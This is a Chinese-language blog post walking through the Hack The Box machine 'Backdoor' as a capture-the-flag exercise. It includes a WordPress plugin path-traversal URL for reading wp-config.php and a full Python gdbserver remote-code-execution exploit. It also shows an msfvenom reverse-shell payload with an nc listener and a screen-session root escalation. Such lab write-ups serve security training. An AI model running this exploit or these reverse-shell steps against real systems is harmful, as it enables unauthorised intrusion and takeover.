<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Backdoor - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Backdoor靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-21 20:41 EST">
<meta property="og:type" content="article">
<meta property="og:title" content="Backdoor - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Backdoor靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-21 20:41 EST">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/aa013859-cc94-4d60-aee8-126626eb8298.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/c5f4885a-3c5a-43a4-a83a-cff2f782854e.png">
<meta property="article:published_time" content="2021-11-24T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:40:20.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/aa013859-cc94-4d60-aee8-126626eb8298.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Backdoor - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Backdoor - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-11-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-11-24
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Backdoor"><span class="post-toc-text">Hackthebox - Backdoor</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-1"><span class="post-toc-text">Step 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-2"><span class="post-toc-text">Step 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-3"><span class="post-toc-text">Step 3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-4"><span class="post-toc-text">Step 4</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Backdoor"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Backdoor - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-11-24 19:38:36" datetime="2021-11-24T11:38:36.000Z"  itemprop="datePublished">2021-11-24</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Backdoor"><a href="#Hackthebox-Backdoor" class="headerlink" title="Hackthebox - Backdoor"></a>Hackthebox - Backdoor</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/aa013859-cc94-4d60-aee8-126626eb8298.png" class>

<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/c5f4885a-3c5a-43a4-a83a-cff2f782854e.png" class>

<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用nmap进行端口扫描</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 20:41 EST
Nmap scan report for 10.10.11.125
Host is up (0.39s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor – Real-Life
1337/tcp open  waste?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/21%OT=22%CT=1%CU=33566%PV=Y%DS=2%DC=T%G=Y%TM=619AF5
OS:A4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=FB%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   492.34 ms loaclhost (10.10.14.1)
2   492.34 ms 10.10.11.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.37 seconds
</code></pre>
<p>从上可以看到该台靶机使用了WordPress 5.8.1 CMS作为服务搭建，咱们去wpscan一下，顺便搜索看看是否有漏洞</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Sun Nov 21 20:55:16 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
 |  - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;Version: 2.8&#39;

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:30 &lt;====================================================================================================================================&gt; (358 / 358) 100.00% Time: 00:00:30
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:04:14 &lt;==================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:04:14

[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 &lt;======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov 21 21:00:23 2021
[+] Requests Done: 2976
[+] Cached Requests: 18
[+] Data Sent: 836.808 KB
[+] Data Received: 721.12 KB
[+] Memory used: 297.57 MB
[+] Elapsed time: 00:05:07
</code></pre>
<p>这边扫描后并没有什么太多有用的信息，插件和主题都没扫描出来，但知道了管理员用户为admin</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# searchsploit WordPress 5.8.1
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities                                                                                                               | php/webapps/39553.txt
WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection                                                                                                                         | php/webapps/44943.txt
WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection                                                                                                                       | php/webapps/48918.sh
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>搜索后也发现确实存在三个漏洞，但都是插件漏洞，暂时无法确定是否存在这些插件，咱们先去</p>
<p>看看网站内容</p>


<p>点击Home以后跳转到<a href="http://backdoor.htb/" target="_blank" rel="noopener">http://backdoor.htb/</a>然后提示咱们无法访问，把backdoor.htb加入hosts里再访问</p>
<p>加入后简单看了一下似乎没有什么东西，咱们扫描一下路径看看吧</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 50 -u http://backdoor.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/11/21 21:15:59 Starting gobuster in directory enumeration mode
===============================================================
http://backdoor.htb/wp-content           (Status: 301) [Size: 317] [--&gt; http://backdoor.htb/wp-content/]
http://backdoor.htb/wp-includes          (Status: 301) [Size: 318] [--&gt; http://backdoor.htb/wp-includes/]
http://backdoor.htb/wp-admin             (Status: 301) [Size: 315] [--&gt; http://backdoor.htb/wp-admin/]   
http://backdoor.htb/server-status        (Status: 403) [Size: 277]                                       

===============================================================
2021/11/21 21:47:17 Finished
===============================================================
</code></pre>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>还是没什么东西，有点难搞啊，只能手动去访问了，首先先去content看看吧</p>
<p>访问content后是空白页面，然后接着根据经验进行手动访问（由于我使用的是流量在进行渗透，继续爆破工作量比较大，只能根据经验进行判断了）</p>
<p><a href="http://backdoor.htb/wp-content/plugins/" target="_blank" rel="noopener">http://backdoor.htb/wp-content/plugins/</a>在该路径下有内容了，并且是一个目录遍历漏洞</p>


<p>ebook-download应当是一个wordpress的插件，进去看一下</p>


<p>有内容的只有readme.txt 进去看一下</p>


<p>确认是一个插件，咱们去exploit-db搜索一下是否有漏洞</p>
<blockquote>
<p><a href="https://www.exploit-db.com/exploits/39575" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39575</a></p>
</blockquote>
<p>还真让我们找到一个漏洞</p>
<pre><code class="bash">http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
</code></pre>
<p>这是一个任意文件下载的漏洞，下载一个配置文件看一下</p>


<p>确认漏洞存在且可被利用，拿着对数据库密码去尝试一下是否可以登录admin用户</p>


<p>好吧看来是我年轻了，是无法直接利用的，咱们还得想办法进入数据库</p>
<p>突然来了灵感，或许突破口在无法读取到任何信息的1337端口上呢？但是我们无法读取1337端口，怎么知道它是什么服务呢？</p>
<p>有办法</p>
<p>使用Wordpress插件的LFI（本地文件包含）来进行端口读取，咱说干就干</p>


<p>像这样读取&#x2F;proc&#x2F;pid&#x2F;cmdline文件就可以了，其中pid是可变数字，根据测试数字范围应该在900-1000之间</p>


<p>所以我们像这样设置好就可以开始爆破了</p>


<p>有了，可以看到这里有一个gdbserver的服务，经过测试该服务是架设在1337端口上的，可以进行利用</p>
<p>同时还发现一个有趣的东西</p>


<p>瞧瞧，这还没getshell呢，已经把root的东西都搞到了，也是没谁了</p>
<blockquote>
<p><a href="https://www.exploit-db.com/exploits/50539" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/50539</a></p>
</blockquote>
<p>这里找到了一篇gdbserver rce的exploit，开干</p>
<p>首先将exploit保存到本地</p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><pre><code class="bash"># Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3

import binascii
import socket
import struct
import sys

help = f&#39;&#39;&#39;
Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;

Example:
- Victim&#39;s gdbserver   -&gt;  10.10.10.200:1337
- Attacker&#39;s listener  -&gt;  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
&#39;&#39;&#39;

def checksum(s: str) -&gt; str:
    res = sum(map(ord, s)) % 256
    return f&#39;{res:2x}&#39;

def ack(sock):
    sock.send(b&#39;+&#39;)

def send(sock, s: str) -&gt; str:
    sock.send(f&#39;${s}#{checksum(s)}&#39;.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()

def exploit(sock, payload: str):
    send(sock, &#39;qSupported:multiprocess+;qRelocInsn+;qvCont+;&#39;)
    send(sock, &#39;!&#39;)

    try:
        res = send(sock, &#39;vCont;s&#39;)
        data = res.split(&#39;;&#39;)[2]
        arch, pc = data.split(&#39;:&#39;)
    except Exception:
        print(&#39;[!] ERROR: Unexpected response. Try again later&#39;)
        exit(1)

    if arch == &#39;10&#39;:
        print(&#39;[+] Found x64 arch&#39;)
        pc = binascii.unhexlify(pc[:pc.index(&#39;0*&#39;)])
        pc += b&#39;\0&#39; * (8 - len(pc))
        addr = hex(struct.unpack(&#39;&lt;Q&#39;, pc)[0])[2:]
        addr = &#39;0&#39; * (16 - len(addr)) + addr
    elif arch == &#39;08&#39;:
        print(&#39;[+] Found x86 arch&#39;)
        pc = binascii.unhexlify(pc)
        pc += b&#39;\0&#39; * (4 - len(pc))
        addr = hex(struct.unpack(&#39;&lt;I&#39;, pc)[0])[2:]
        addr = &#39;0&#39; * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print(&#39;[+] Sending payload&#39;)
    send(sock, f&#39;M{addr},{hex_length}:{payload}&#39;)
    send(sock, &#39;vCont;c&#39;)

def main():
    if len(sys.argv) &lt; 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(&#39;:&#39;)
    file = sys.argv[2]

    try:
        with open(file, &#39;rb&#39;) as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f&#39;[!] ERROR: File {file} not found&#39;)
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print(&#39;[+] Connected to target. Preparing exploit&#39;)
        exploit(sock, payload)
        print(&#39;[*] Pwned!! Check your listener&#39;)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>然后使用msfvenom生成一个木马</p>
<pre><code class="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 PrependFork=true -o rev.bin
</code></pre>
<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>使用nc监听一个本地端口</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>执行Exploit</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# python3 exploit.py 10.10.11.125:1337 rev.bin                                          1 ⨯
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
</code></pre>
<p>然后成功弹回一个shell</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 4444   
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.125] 50626
whoami&amp;&amp;id
user
uid=1000(user) gid=1000(user) groups=1000(user)
</code></pre>
<p>使用python3获取一个交互式shell</p>
<pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
user@Backdoor:/home/user$

user@Backdoor:/home/user$ ls
ls
user.txt
user@Backdoor:/home/user$ cat user.txt  
cat user.txt
10ba3c92228d369cea03eec58f58420c
</code></pre>
<p>成功拿到user权限的flag</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>还记得我们之前看到的screen吗？这就是提权的关键，提权只需要两句</p>
<pre><code class="bash">export TERM=xterm
screen -x root/root
</code></pre>
<p>然后即可进入root权限</p>
<pre><code class="bash">root@Backdoor:~# whoami&amp;&amp;id
whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>成功提权到root权限</p>
<pre><code class="bash">root@Backdoor:~# ls
ls
root.txt
root@Backdoor:~# cat root.txt
cat root.txt
692be0661cb8d3c7cdf05379c93b9e8c
</code></pre>
<p>成功拿到root用户的flag权限</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/&title=《Backdoor - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/&title=《Backdoor - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Backdoor - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/11/26/Hackthebox/Easy/Hackthebox-Driver/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Driver - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/11/13/Vulnhub/Vulnhub%20-Kioptrix/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Kioptrix Level 1 - Vulnhub</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
